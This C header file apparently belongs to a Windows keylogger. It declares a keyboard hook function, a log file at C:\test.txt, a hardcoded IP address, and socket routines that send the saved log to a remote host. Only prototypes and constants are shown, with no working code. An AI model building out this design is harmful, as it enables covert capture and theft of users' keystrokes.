#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <io.h>
#include <WS2tcpip.h>
#include <IPHlpApi.h>
#include <rpc.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#define BUFFSIZE 1024
#define LOGFILE		"C:\\test.txt"
#define IP "10.224.52.112"

struct keyboard
{
	DWORD code;
	char *character;
};

void	setwinhook();
void	save_data(const char*);
SOCKET	init_socket(SOCKET*);
void	send_data(SOCKET*, FILE*);
void	keep_alive_client_and_init(void);
void	server(SOCKET *);